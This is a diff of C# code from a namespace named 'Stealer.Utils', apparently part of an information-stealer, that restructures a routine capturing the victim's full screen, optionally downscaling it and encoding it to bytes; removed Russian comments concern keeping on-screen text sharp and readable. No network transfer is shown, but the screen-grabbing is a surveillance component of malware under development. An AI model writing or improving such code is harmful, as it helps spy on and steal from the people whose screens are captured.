@@ -71,7 +71,6 @@ namespace Stealer.Utils
                 int srcH = GetScreenHeight();
                 if (srcW <= 0 || srcH <= 0) return null;
 
-                // Для HighQualityText не делаем ресайз вообще — 100% честное четкое чтение текста!
                 int targetW = srcW;
                 int targetH = srcH;
 
@@ -81,23 +80,34 @@ namespace Stealer.Utils
                     targetH = (int)((double)srcH * 1280 / srcW);
                 }
 
-                using (var srcBmp = new Bitmap(srcW, srcH, PixelFormat.Format24bppRgb))
+                if (targetW == srcW && targetH == srcH)
                 {
-                    using (var g = Graphics.FromImage(srcBmp))
+                    using (var bmp = new Bitmap(srcW, srcH, PixelFormat.Format24bppRgb))
                     {
-                        g.CopyFromScreen(0, 0, 0, 0, new Size(srcW, srcH), CopyPixelOperation.SourceCopy);
+                        using (var g = Graphics.FromImage(bmp))
+                        {
+                            g.CopyFromScreen(0, 0, 0, 0, new Size(srcW, srcH), CopyPixelOperation.SourceCopy);
+                        }
+                        using (var ms = new MemoryStream())
+                        {
+                            bmp.Save(ms, encoder, encParams);
+                            return ms.ToArray();
+                        }
                     }
-
-                    if (targetW != srcW || targetH != srcH)
+                }
+                else
+                {
+                    using (var srcBmp = new Bitmap(srcW, srcH, PixelFormat.Format24bppRgb))
                     {
+                        using (var g = Graphics.FromImage(srcBmp))
+                        {
+                            g.CopyFromScreen(0, 0, 0, 0, new Size(srcW, srcH), CopyPixelOperation.SourceCopy);
+                        }
                         using (var resizedBmp = new Bitmap(targetW, targetH, PixelFormat.Format24bppRgb))
                         {
                             using (var gResize = Graphics.FromImage(resizedBmp))
                             {
-                                // Четкая интерполяция для текста при режиме HighQualityText
-                                gResize.InterpolationMode = mode == StreamMode.HighQualityText
-                                    ? System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic
-                                    : System.Drawing.Drawing2D.InterpolationMode.Low;
+                                gResize.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Low;
                                 gResize.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.HighSpeed;
                                 gResize.PixelOffsetMode = System.Drawing.Drawing2D.PixelOffsetMode.HighSpeed;
                                 gResize.DrawImage(srcBmp, 0, 0, targetW, targetH);
@@ -107,14 +117,6 @@ namespace Stealer.Utils
                                 resizedBmp.Save(ms, encoder, encParams);
                                 return ms.ToArray();
                             }
-                        }
-                    }
-                    else
-                    {
-                        using (var ms = new MemoryStream())
-                        {
-                            srcBmp.Save(ms, encoder, encParams);
-                            return ms.ToArray();
                         }
                     }
                 }
